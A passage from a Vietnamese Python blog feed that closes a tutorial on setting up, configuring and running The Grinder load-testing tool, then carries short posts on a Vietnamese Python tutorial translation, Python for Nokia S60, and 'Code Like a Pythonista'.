&lt;span class="k"&gt;PATH&lt;/span&gt;=&lt;span class="nv"&gt;%JAVA_HOME%&lt;/span&gt;\bin;&lt;span class="nv"&gt;%PATH%&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Hoặc gán trực tiếp biến môi trường mỗi khi khởi động bằng cách:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Vào System Properties chọn tab Advanced chọn tiếp Environment Variables&lt;/li&gt;
&lt;li&gt;Chọn New và thêm vào tên biến và đường dẫn như trên.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="doi-voi-unix"&gt;
&lt;h3&gt;Đối với Unix&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Tạo tập tin kịch bản &lt;tt class="docutils literal"&gt;setGrinderEnv.sh&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/ksh&lt;/span&gt;
&lt;span class="nv"&gt;GRINDERPATH&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to grinder install directory&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;GRINDERPROPERTIES&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to grinder.properties&lt;span class="o"&gt;)&lt;/span&gt;/grinder.properties
&lt;span class="nv"&gt;CLASSPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$GRINDERPATH&lt;/span&gt;/lib/grinder.jar:&lt;span class="nv"&gt;$CLASSPATH&lt;/span&gt;
&lt;span class="nv"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to java install directory&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$JAVA_HOME&lt;/span&gt;/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; CLASSPATH PATH GRINDERPROPERTIES
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Hoặc gán trực tiếp mỗi khi đăng nhập vào người dùng bằng cách thêm vào trong tập tin &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;/home/$USER/.bashrc&lt;/span&gt;&lt;/tt&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;GRINDERPATH&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to grinder install directory&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;GRINDERPROPERTIES&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to grinder.properties&lt;span class="o"&gt;)&lt;/span&gt;/grinder.properties
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;CLASSPATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$GRINDERPATH&lt;/span&gt;/lib/grinder.jar:&lt;span class="nv"&gt;$CLASSPATH&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;JAVA_HOME&lt;/span&gt;&lt;span class="o"&gt;=(&lt;/span&gt;full path to java install directory&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="cau-hinh"&gt;
&lt;h2&gt;Cấu hình&lt;/h2&gt;
&lt;p&gt;Tập tin thuộc tính &lt;tt class="docutils literal"&gt;grinder.properties&lt;/tt&gt; thường gồm các tham số sau:&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="31%" /&gt;
&lt;col width="44%" /&gt;
&lt;col width="25%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Tên tham số&lt;/th&gt;
&lt;th class="head"&gt;Giải thích&lt;/th&gt;
&lt;th class="head"&gt;Giá trị mặc định&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.processes&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Số lượng tiến trình worker mà một agent khởi tạo&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.threads&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Số lượng tiểu trình mà mỗi tiến trình worker sinh ra&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.runs&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Số lần chạy kịch bản kiểm thử mà mỗi tiểu trình
chạy. 0 nghĩa là chạy lặp đi lặp lại. Tham số này
nên để là 0 khi sử dụng Console để điều khiển hoạt
động của các agent.&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.processIncrement&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Nếu đặt, agent sẽ tăng số lượng tiếng trình worker
lên sau mỗi nhịp
&lt;tt class="docutils literal"&gt;grinder.processIncrementInterval&lt;/tt&gt;.&lt;/td&gt;
&lt;td&gt;0 (Khởi động tất cả các
tiến trình worker cùng lúc.)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.processIncrementInterval&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Sử dụng cùng với tham số
&lt;tt class="docutils literal"&gt;grinder.processIncrement&lt;/tt&gt;, tham số này xác định
nhịp tăng tiến trình worker tính theo mili giây.&lt;/td&gt;
&lt;td&gt;60000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.initialProcesses&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Sử dụng cùng với tham số
&lt;tt class="docutils literal"&gt;grinder.processIncrement&lt;/tt&gt;, tham số này xác định
số lượng tiến trình worker khởi động.&lt;/td&gt;
&lt;td&gt;Giá trị của
&lt;tt class="docutils literal"&gt;grinder.processIncrement&lt;/tt&gt;.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.duration&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Thời gian mỗi tiến trình worker chạy. Tham số này có
thể xác định cùng với tham số &lt;tt class="docutils literal"&gt;grinder.runs&lt;/tt&gt;, điều
đó có nghĩa là tiến trình worker sẽ chấm dứt nếu hết
thời gian chạy hoặc số lượng tiến trình worker đạt
tối đa.&lt;/td&gt;
&lt;td&gt;0 (Không kết thúc.)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.script&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Tên tập tin kịch bản sẽ chạy.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.py&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.jvm&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Sử dụng máo ảo Java (JVM) khác. Mặc định là &lt;tt class="docutils literal"&gt;java&lt;/tt&gt;
nên không cần phải khai báo nếu đã có sẵn trong
đường dẫn (PATH).&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;java&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.jvm.classpath&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Dùng để xác định đường dẫn đến các lớp sử dụng cho
tiến trình worker. Bất cứ đường dẫn nào xác định ở
đây sẽ được thêm vào trong đường dẫn classpath sử
dụng để khởi động tiến trình Grinder.&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.jvm.arguments&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Các tham số phụ thêm cho tiến trình worker.&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.logDirectory&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Thư mục lưu tập tin log. Tự động tạo nếu chưa có.&lt;/td&gt;
&lt;td&gt;Thư mục cục bộ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.numberOfOldLogs&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Số lượng nhật kí được lưu lại từ lần chạy trước đó.&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.hostID&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Thay thế chuỗi &lt;tt class="docutils literal"&gt;host&lt;/tt&gt; sử dụng trong tên tập tin
nhật kí và trong nhật kí.&lt;/td&gt;
&lt;td&gt;Tên máy&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.consoleHost&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Địa chỉ IP hoặc tên máy sử dụng cho kết nối giữa các
agent, tiến trình worker và console.&lt;/td&gt;
&lt;td&gt;Tất cả các giao tiếp
mạng của máy.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.consolePort&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Cổng để agent và tiến trình worker sử dụng để kết
nối đến console.&lt;/td&gt;
&lt;td&gt;6372&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.useConsole&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Nếu đặt là &lt;tt class="docutils literal"&gt;false&lt;/tt&gt;, agent và tiến trình worker sẽ
không sử dụng console.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;true&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.reportToConsole.interval&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Khoảng thời gian mỗi tiến trình gửi cập nhật về cho
console. Tham số này cũng xác định khoảng thời gian
các tập tin dữ liệu được làm mới. Giá trị tính theo
mili giây.&lt;/td&gt;
&lt;td&gt;500&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.initialSleepTime&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Khoảng thời gian tối đa mỗi tiểu trình đợi trước khi
bắt đầu. Không giống như thời gian ngừng trong kịch
bản, tham số này thay đổi ngẫu nhiên giữa 0 và giá
trị được đặt. Bị ảnh hưởng bởi tham số
&lt;tt class="docutils literal"&gt;grinder.sleepTimeFactor&lt;/tt&gt;, còn tham số
&lt;tt class="docutils literal"&gt;grinder.sleepTimeVariation&lt;/tt&gt; thì không. Giá trị
tính theo mili giây.&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.sleepTimeFactor&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Thêm một hệ số vào thời gian chờ đã đặt, thông qua
một thuộc tính hay trong kịch bản. Đặt giá trị này
là 0.1 kịch bản sẽ chạy nhanh hơn mười lần.&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.sleepTimeVariation&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Thông thường, Grinder thay đổi thời gian chờ xác
định trong kịch bản tùy theo sự phân chia bình
thường. Tham số này xác định một dải phân đoạn mà đa
số (chiếm 99.75%) là sẽ rơi vào trong dải này. Ví
dụ, nếu thời gian chờ xác định là 1000 và
&lt;tt class="docutils literal"&gt;sleepTimeVariation&lt;/tt&gt; đặt là 0.1, khi đó 99.75% các
giá trị thời gian chờ sẽ nằm trong khoảng 900 và
1100 milli giây.&lt;/td&gt;
&lt;td&gt;0.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.logProcessStreams&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Đặt là &lt;tt class="docutils literal"&gt;false&lt;/tt&gt; để tắt tính năng ghi nhật kí những
thông báo và lỗi hiển thị của tiến trình worker.
Dùng tham số này để giảm tải cho các tiểu trình tại
máy trạm.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;true&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.reportTimesToConsole&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Đặt là &lt;tt class="docutils literal"&gt;false&lt;/tt&gt; để tắt tính năng phản hồi thông tin
thời gian về cho console, các thông tin thống kê
khác vẫn được phản hồi.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;true&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.debug.singleprocess&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Nếu đặt là &lt;tt class="docutils literal"&gt;true&lt;/tt&gt;, agent sẽ phát sinh tiểu trình
để chạy kịch bản thay vì tiến trình, sử dụng một bộ
nạp lớp đặc biệt để cô lập engine ra. Điều này cho
phép engine dễ gỡ rối hơn. Mục đích chính của công
cụ này là gỡ rối Grinder engine, tuy nhiên nó cũng
có thể dùng cho người dùng chuyên nghiệp vào các mục
đích khác.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;false&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;&lt;tt class="docutils literal"&gt;grinder.useNanoTime&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;Nết đặt là &lt;tt class="docutils literal"&gt;true&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;System.nanoTime()&lt;/tt&gt; sẽ được
dùng để đo thời gian thay vì
&lt;tt class="docutils literal"&gt;System.currentTimeMills()&lt;/tt&gt;. Grinder sẽ vẫn phản
hồi thời gian tính bằng mili giây. Độ chính xác của
những phương pháp này phụ thuộc vào sự hiện thực hóa
JVM và hệ điều hành. Tham số &lt;tt class="docutils literal"&gt;true&lt;/tt&gt; chỉ dùng cho
J2SE 5 hoặc lớn hơn.&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;false&lt;/tt&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;div class="section" id="vi-du"&gt;
&lt;h2&gt;Ví dụ&lt;/h2&gt;
&lt;p&gt;Thông thường, một tập tin cấu hình đơn giản chỉ cần các thông số sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
grinder.process 1
grinder.threads 1
grinder.runs 1
grinder.script sample.py
&lt;/pre&gt;
&lt;p&gt;Nếu chạy ở chế độ có Console thì cần thêm:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
grinder.useConsole true
grinder.consoleHost x.x.x.x (IP hoặc tên máy Console)
grinder.consolePort xxx (cổng quy định bởi Console)
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="chay"&gt;
&lt;h2&gt;Chạy&lt;/h2&gt;
&lt;p&gt;Để chạy Grinder có thể đơn giản như sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Chạy Console:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
java net.grinder.Console
&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Chạy Agent:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
java net.grinder.Grinder
&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hoặc tạo tập tin kịch bản như sau:&lt;/p&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;Đối với Windows&lt;/h3&gt;
&lt;p&gt;startAgent.cmd&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;path&lt;/span&gt; to setGrinderEnv.cmd&lt;span class="p"&gt;)&lt;/span&gt;\setGrinderEnv.cmd
&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;%CLASSPATH%&lt;/span&gt;
java -cp &lt;span class="nv"&gt;%CLASSPATH%&lt;/span&gt; net.grinder.Grinder &lt;span class="nv"&gt;%GRINDERPROPERTIES%&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;startConsole.cmd&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;path&lt;/span&gt; to setGrinderEnv.cmd&lt;span class="p"&gt;)&lt;/span&gt;\setGrinderEnv.cmd
java -cp &lt;span class="nv"&gt;%CLASSPATH%&lt;/span&gt; net.grinder.Console
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;Đối với Unix&lt;/h3&gt;
&lt;p&gt;startAgent.sh&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/ksh&lt;/span&gt;
. &lt;span class="o"&gt;(&lt;/span&gt;path to setGrinderEnv.sh&lt;span class="o"&gt;)&lt;/span&gt;/setGrinderEnv.sh
java -cp &lt;span class="nv"&gt;$CLASSPATH&lt;/span&gt; net.grinder.Grinder &lt;span class="nv"&gt;$GRINDERPROPERTIES&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;startConsole.sh&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/ksh&lt;/span&gt;
. &lt;span class="o"&gt;(&lt;/span&gt;path to setGrinderEnv.sh&lt;span class="o"&gt;)&lt;/span&gt;/setGrinderEnv.sh
java -cp &lt;span class="nv"&gt;$CLASSPATH&lt;/span&gt; net.grinder.Console
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Công việc tiếp theo chỉ là... viết kịch bản kiểm thử và chạy.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="tu-dong-hoa"&gt;
&lt;h2&gt;Tự động hóa&lt;/h2&gt;
&lt;p&gt;Đến đây hẳn nhiều người, nhất là những lập trình viên không (chưa) biết ngôn ngữ Python sẽ tiếc nuối vì không biết viết mã cho kịch bản kiểm thử như thế nào. Nhưng có một cách để những lập trình viên này vẫn có thể dùng công cụ kiểm thử mạnh mẽ Grinder mà không cần phải biết viết một dòng mã Python nào. Từ phiên bản 3.0 trở lên, Grinder cung cấp một môi trường proxy kiểm soát dữ liệu vào ra để tự động tạo mã kịch bản tương ứng. Điều đó có nghĩa là, kịch bản sẽ tự động được tạo ra theo đúng những thao tác chuột và bàn phím mà những người kiểm thử làm. Và tất nhiên cách này chỉ dùng cho những kiểm thử đối với các ứng dụng web.&lt;/p&gt;
&lt;p&gt;Để khởi động Grinder proxy:&lt;/p&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;Đối với Windows&lt;/h3&gt;
&lt;p&gt;startProxy.cmd&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;path&lt;/span&gt; to setGrinderEnv.cmd&lt;span class="p"&gt;)&lt;/span&gt;\setGrinderEnv.cmd
java -cp &lt;span class="nv"&gt;%CLASSPATH%&lt;/span&gt; net.grinder.TCPProxy -console -http &lt;span class="p"&gt;&amp;gt;&lt;/span&gt; script_name.py
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;Đối với Unix&lt;/h3&gt;
&lt;p&gt;startProxy.sh&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/ksh&lt;/span&gt;
. &lt;span class="o"&gt;(&lt;/span&gt;path to setGrinderEnv.sh&lt;span class="o"&gt;)&lt;/span&gt;/setGrinderEnv.sh
java -cp &lt;span class="nv"&gt;$CLASSPATH&lt;/span&gt; net.grinder.TCPProxy -console -http &amp;gt; script_name.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sau đó thiết đặt trình duyệt cho trỏ đến proxy là &lt;tt class="docutils literal"&gt;localhost&lt;/tt&gt; với cổng &lt;tt class="docutils literal"&gt;8081&lt;/tt&gt; và bắt đầu các thao tác kiểm thử.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="tong-ket"&gt;
&lt;h2&gt;Tổng kết&lt;/h2&gt;
&lt;p&gt;Trên đây là những bước cơ bản nhất để có thể làm quen với một công cụ kiểm thử vô cùng mạnh mẽ, đơn giản, dễ dùng và đặc biệt là hoàn toàn miễn phí. Mặc dù chạy trên nền Java nhưng trong quá trình thử nghiệm cũng như sử dụng để kiểm thử hệ thống Online Trading của công ty Chứng khoán VNDirect, Grinder chạy rất nhẹ nhàng, không tốn nhiều RAM như tôi lo ngại, thậm chí tôi sử dụng chính các máy của người dùng làm agent trong khi mọi người vẫn làm việc mà không hề thấy hệ thống bị kéo chậm lại hay có vấn đề gì xảy ra. Việc làm quen với Grinder cũng không mất quá nhiều thời gian, kể cả với một tay ngang như tôi. Grinder thật sự rất ấn tượng. Và điểm nổi trội nhất của Grinder đó là nó cho phép người dùng tự định nghĩa kịch bản kiểm thử bằng một ngôn ngữ mạnh mẽ và mềm dẻo - Python.&lt;/p&gt;
&lt;/div&gt;
</content><category term="load test"></category><category term="jython"></category><category term="grinder"></category></entry><entry><title>Phát hành Bài chỉ dẫn Python 2.5</title><link href="/2007/09/phat-hanh-bai-chi-dan-python-25.html" rel="alternate"></link><published>2007-09-25T21:50:00+07:00</published><updated>2007-09-25T21:50:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2007-09-25:/2007/09/phat-hanh-bai-chi-dan-python-25.html</id><summary type="html">&lt;p&gt;&lt;em&gt;Bài chỉ dẫn Python&lt;/em&gt; 2.5 tiếng Việt đã được nhóm Python cho người Việt phát hành vào ngày 26 tháng 09 năm 2007.&lt;/p&gt;
&lt;p&gt;Ngày 26 tháng 09 năm 2007, theo đúng như dự định, nhóm Python cho người Việt đã chính thức phát hành bản dịch của tài liệu …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;Bài chỉ dẫn Python&lt;/em&gt; 2.5 tiếng Việt đã được nhóm Python cho người Việt phát hành vào ngày 26 tháng 09 năm 2007.&lt;/p&gt;
&lt;p&gt;Ngày 26 tháng 09 năm 2007, theo đúng như dự định, nhóm Python cho người Việt đã chính thức phát hành bản dịch của tài liệu &lt;em&gt;Python Tutorial&lt;/em&gt; với tên &lt;strong&gt;Bài chỉ dẫn Python&lt;/strong&gt;. Tài liệu này giới thiệu người đọc những khái niệm nhập môn cơ bản của ngôn ngữ Python và các thư viện có sẵn của nó. Người mới học, cũng như các chuyên gia trong ngành Công Nghệ Thông Tin có thể tìm được nhiều thông tin bổ ích từ tài liệu.&lt;/p&gt;
&lt;p&gt;Phát biểu về sự kiện này, anh Nguyễn Thành Nam (một trong các dịch giả và là thành viên của nhóm Python cho người Việt) nhận xét:&lt;/p&gt;
&lt;blockquote&gt;
Việc có mặt một tài liệu Python tiếng Việt hoàn toàn miễn phí là một dấu mốc quan trọng trong việc đưa ngôn ngữ Python đến gần hơn với người dùng Việt Nam.&lt;/blockquote&gt;
&lt;p&gt;Anh cũng cho biết thêm rằng bản dịch này là sự hợp tác của nhiều dịch giả từ khắp nơi trên thế giới có cùng niềm đam mê với ngôn ngữ Python và mong muốn giới thiệu và phát triển nó rộng rãi ở Việt Nam.&lt;/p&gt;
&lt;p&gt;Tài liệu có thể được truy cập tại địa chỉ &lt;a class="reference external" href="http://www.vithon.org/tutorial/2.5/tut.html"&gt;http://www.vithon.org/tutorial/2.5/tut.html&lt;/a&gt;.&lt;/p&gt;
</content><category term="tutorial"></category></entry><entry><title>Python S60 cho người mới bắt đầu</title><link href="/2007/08/python-s60-cho-nguoi-moi-bat-dau.html" rel="alternate"></link><published>2007-08-18T12:54:00+07:00</published><updated>2007-08-18T12:54:00+07:00</updated><author><name>Trịnh Thành Trung</name></author><id>tag:None,2007-08-18:/2007/08/python-s60-cho-nguoi-moi-bat-dau.html</id><summary type="html">&lt;p&gt;Xin chào các bạn, mình là thành viên mới của forum. Mình thực sự rất yêu thích Python, và cũng mới bắt đầu nghiên cứu về Python trong thời gian gần đây. Đặc biệt mình có nghiên cứu thêm về phát triển ứng dụng Python cho điện thoại Nokia S60 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Xin chào các bạn, mình là thành viên mới của forum. Mình thực sự rất yêu thích Python, và cũng mới bắt đầu nghiên cứu về Python trong thời gian gần đây. Đặc biệt mình có nghiên cứu thêm về phát triển ứng dụng Python cho điện thoại Nokia S60. Trong quá trình học mình có ghi chép lại những gì đã học thành tài liệu Python S60 cho người mới bắt đầu. Tài liệu này mình vẫn viết, được cập nhật hàng ngày và có thể xem cũng như download tại &lt;a class="reference external" href="http://my.opera.com/noname00/forums/topic.dml?id=198943"&gt;http://my.opera.com/noname00/forums/topic.dml?id=198943&lt;/a&gt; (Khuyến cáo nên down bản PDF, vì nếu có thay đổi thì bản PDF sẽ được thay đổi chứ mình không thay đổi trên forum :D)&lt;/p&gt;
&lt;p&gt;Mình nghĩ nó thích hợp cho cả những người mới bắt đầu làm quen với Python (như mình) cũng như những người thích lập trình Python cho điện thoại di động.&lt;/p&gt;
&lt;p&gt;Mong các bạn cho ý kiến&lt;/p&gt;
</content><category term="dummy"></category><category term="s60"></category></entry><entry><title>Lập trình như một Pythonista: Thành ngữ Python</title><link href="/2007/07/lap-trinh-nhu-mot-pythonista-thanh-ngu-python.html" rel="alternate"></link><published>2007-07-27T21:57:00+07:00</published><updated>2007-07-27T21:57:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2007-07-27:/2007/07/lap-trinh-nhu-mot-pythonista-thanh-ngu-python.html</id><summary type="html">&lt;p&gt;Bản lược dịch của bài nói chuyện &amp;quot;Code Like a Pythonista: Idiomatic Python&amp;quot; do David Goodger trình bày tại PyCon 2007 và OSCON 2007.&lt;/p&gt;
&lt;p&gt;Ngày 26 tháng 07 năm 2007, David Goodger gửi bài nói chuyện &lt;a class="reference external" href="http://python.net/~goodger/projects/pycon/2007/idiomatic/"&gt;Code Like a Pythonista: Idiomatic Python&lt;/a&gt; mà ông đã trình bày ở PyCon 2007 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bản lược dịch của bài nói chuyện &amp;quot;Code Like a Pythonista: Idiomatic Python&amp;quot; do David Goodger trình bày tại PyCon 2007 và OSCON 2007.&lt;/p&gt;
&lt;p&gt;Ngày 26 tháng 07 năm 2007, David Goodger gửi bài nói chuyện &lt;a class="reference external" href="http://python.net/~goodger/projects/pycon/2007/idiomatic/"&gt;Code Like a Pythonista: Idiomatic Python&lt;/a&gt; mà ông đã trình bày ở PyCon 2007 và OSCON 2007 lên trang nhà. Đây là bài lược dịch những ý chính.&lt;/p&gt;
